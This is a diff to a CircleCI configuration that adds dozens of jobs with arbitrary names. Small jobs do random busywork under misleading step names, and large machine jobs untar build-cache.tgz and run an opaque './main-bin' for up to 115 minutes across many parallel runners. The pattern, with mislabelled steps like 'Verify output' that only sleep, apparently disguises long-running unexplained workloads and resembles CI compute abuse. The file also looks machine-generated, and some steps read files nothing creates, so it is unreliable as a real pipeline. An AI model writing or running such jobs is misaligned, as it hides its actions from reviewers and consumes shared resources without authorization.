+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/46.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  spinner_QA_CHECK_9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 174080 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/data/539.txt
+            echo "gate QA_CHECK_9: $(wc -c </tmp/data/539.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 539.txt
+  QA_CHECK_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/stats.tsv
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  stepB_v3-alpha3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Freeze working set
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 488680 | paste - - - - | wc -l; true ; } > /tmp/data/ckpt-v2.pkl
+            echo "gate v3-alpha3: $(wc -c </tmp/data/ckpt-v2.pkl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - ckpt-v2.pkl
+  v3-alpha3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/ckpt-v2.pkl
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  precheck_feat-1338:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Build frequency table
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 489740 | sha1sum; true ; } > /tmp/data/step-25.out
+            echo "gate feat-1338: $(wc -c </tmp/data/step-25.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-25.out
+  feat-1338:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/46.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+
+  prebuild_omar-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Collate dictionary rows
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 239717 | sha1sum; true ; } > /tmp/data/stats.json
+            echo "gate omar-test: $(wc -c </tmp/data/stats.json) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - stats.json
+  A_bug-4957_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Reconcile output files
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 29360128 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/data/artifact
+            echo "gate bug-4957: $(wc -c </tmp/data/artifact) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - artifact
+  C_fix-router-crash_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Project latency curve
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 2000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/data/80.bin
+            echo "gate fix-router-crash: $(wc -c </tmp/data/80.bin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 80.bin
+  drain_rust-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Trim duplicate rows
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 12582912 /dev/urandom | md5sum; true ; } > /tmp/data/handover.txt
+            echo "gate rust-release: $(wc -c </tmp/data/handover.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - handover.txt
+workflows:
+  ci:
+    jobs:
+      - vendor_uniform
+      - uniform:
+          requires:
+            - vendor_uniform
+      - ensure_cf-2a:
+          requires:
+            - vendor_uniform
+      - cf-2a:
+          requires:
+            - ensure_cf-2a
+      - cook_delta:
+          requires:
+            - ensure_cf-2a
+      - delta:
+          requires:
+            - cook_delta
+      - cook_sanity:
+          requires:
+            - cook_delta
+      - sanity:
+          requires:
+            - cook_sanity
+      - stepB_v3-alpha3:
+          requires:
+            - cook_sanity
+      - v3-alpha3:
+          requires:
+            - stepB_v3-alpha3
+      - redo_defualt-35:
+          requires:
+            - stepB_v3-alpha3
+      - defualt-35:
+          requires:
+            - redo_defualt-35
+      - produce_europa-v2:
+          requires:
+            - redo_defualt-35
+      - europa-v2:
+          requires:
+            - produce_europa-v2
+      - gamma_go-live:
+          requires:
+            - produce_europa-v2
+      - go-live:
+          requires:
+            - gamma_go-live
+      - produce_p-01
+      - provision_assemble-quick-regression-suite
+      - vendor_update-cache-leak
+      - p-01:
+          requires:
+            - produce_p-01
+            - provision_assemble-quick-regression-suite
+            - vendor_update-cache-leak
+      - assemble-quick-regression-suite:
+          requires:
+            - produce_p-01
+            - provision_assemble-quick-regression-suite
+            - vendor_update-cache-leak
+      - update-cache-leak:
+          requires:
+            - produce_p-01
+            - provision_assemble-quick-regression-suite
+            - vendor_update-cache-leak
+      - nebula-final:
+          requires:
+            - produce_p-01
+            - provision_assemble-quick-regression-suite
+            - vendor_update-cache-leak
+      - bake-it:
+          requires:
+            - produce_p-01
+            - provision_assemble-quick-regression-suite
+            - vendor_update-cache-leak
+      - feat-1338:
+          requires:
+            - produce_p-01
+            - provision_assemble-quick-regression-suite
+            - vendor_update-cache-leak
+      - add-webhook:
+          requires:
+            - produce_p-01
+            - provision_assemble-quick-regression-suite
+            - vendor_update-cache-leak
+      - t-2:
+          requires:
+            - produce_p-01
+            - provision_assemble-quick-regression-suite
+            - vendor_update-cache-leak
+      - round2_green-light
+      - green-light:
+          requires:
+            - round2_green-light
+      - hook_cook-it:
+          requires:
+            - round2_green-light
+      - cook-it:
+          requires:
+            - hook_cook-it
+      - rerun_py310-fmt
+      - D_rl-old
+      - py310-fmt:
+          requires:
+            - rerun_py310-fmt
+            - D_rl-old
+      - rl-old:
+          requires:
+            - rerun_py310-fmt
+            - D_rl-old
+      - verify-staging-release-candidate:
+          requires:
+            - rerun_py310-fmt
+            - D_rl-old
+      - QA_CHECK_9:
+          requires:
+            - rerun_py310-fmt
+            - D_rl-old
+      - Beta_lima
+      - blue_Package_Pipeline8
+      - lima:
+          requires:
+            - Beta_lima
+            - blue_Package_Pipeline8
+      - Package_Pipeline8:
+          requires:
+            - Beta_lima
+            - blue_Package_Pipeline8
+      - Prepare_Release6:
+          requires:
+            - Beta_lima
+            - blue_Package_Pipeline8
+      - INFRA-259:
+          requires:
+            - Beta_lima
+            - blue_Package_Pipeline8
+      - precheck_omar-test
+      - prebuild_omar-test_2:
+          requires:
+            - precheck_omar-test
+      - omar-test:
+          requires:
+            - prebuild_omar-test_2
+      - beta_bug-4957:
+          requires:
+            - prebuild_omar-test_2
+      - A_bug-4957_2:
+          requires:
+            - beta_bug-4957
+      - bug-4957:
+          requires:
+            - A_bug-4957_2
+      - stage_fix-router-crash:
+          requires:
+            - A_bug-4957_2
+      - C_fix-router-crash_2:
+          requires:
+            - stage_fix-router-crash
+      - fix-router-crash:
+          requires:
+            - C_fix-router-crash_2
+      - stepB_rust-release:
+          requires:
+            - C_fix-router-crash_2
+      - drain_rust-release_2:
+          requires:
+            - stepB_rust-release
+      - rust-release:
+          requires:
+            - drain_rust-release_2
